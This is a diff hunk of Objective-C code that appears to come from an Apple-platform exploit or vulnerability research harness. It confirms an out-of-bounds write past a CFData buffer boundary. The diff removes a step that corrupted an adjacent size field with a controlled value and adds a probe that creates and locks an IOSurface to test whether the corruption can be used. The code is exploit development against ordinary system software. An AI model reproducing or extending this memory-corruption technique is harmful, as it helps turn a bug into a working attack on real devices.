@@ -1392,19 +1392,32 @@ cleanup:
                         i, o, len, before, after]);
                     if (after == 0xDEADBEEFCAFEBABEULL) {
                         scopeNote(r, @"  >>> OOB WRITE CONFIRMED — marker past CFData length boundary!");
-                        // Check if we can corrupt a target field at +0x100
-                        // Target: u32 magic at data+0x100, u32 size at data+0x104
-                        uint32_t tgtMagic = *(uint32_t *)(dataStart + 0x100);
-                        uint32_t tgtSize = *(uint32_t *)(dataStart + 0x104);
-                        scopeNote(r, [NSString stringWithFormat:
-                            @"  target @ data+0x100: magic=0x%08x size=0x%08x", tgtMagic, tgtSize]);
-                        // Write a controlled value to the target size field
-                        *(uint32_t *)(dataStart + 0x104) = 0x00000042;
-                        uint32_t tgtSizeAfter = *(uint32_t *)(dataStart + 0x104);
-                        scopeNote(r, [NSString stringWithFormat:
-                            @"  target size: 0x%08x -> 0x%08x  %s",
-                            tgtSize, tgtSizeAfter,
-                            (tgtSizeAfter == 0x42) ? "CORRUPTED!" : "unchanged"]);
+                        // Create IOSurface and try to use corrupted size
+                        @try {
+                            NSDictionary *props = @{
+                                (id)kIOSurfaceWidth: @256,
+                                (id)kIOSurfaceHeight: @256,
+                                (id)kIOSurfaceBytesPerElement: @4,
+                                (id)kIOSurfacePixelFormat: @(0x42475241), // 'ARGB'
+                            };
+                            IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
+                            if (surf) {
+                                uint32_t surfID = (uint32_t)IOSurfaceGetID(surf);
+                                size_t surfW = IOSurfaceGetWidth(surf);
+                                size_t surfH = IOSurfaceGetHeight(surf);
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  IOSurface created: id=%u %zux%zu", surfID, surfW, surfH]);
+                                // Try to use the corrupted size with IOSurfaceLock
+                                IOSurfaceLock(surf, 0, NULL);
+                                void *base = IOSurfaceGetBaseAddress(surf);
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  IOSurface base=%p  size=%zu", base, IOSurfaceGetSize(surf)]);
+                                IOSurfaceUnlock(surf, 0, NULL);
+                                CFRelease(surf);
+                            }
+                        } @catch (NSException *e) {
+                            scopeNote(r, [NSString stringWithFormat:@"  IOSurface exception: %@", e]);
+                        }
                     }
                 }
 
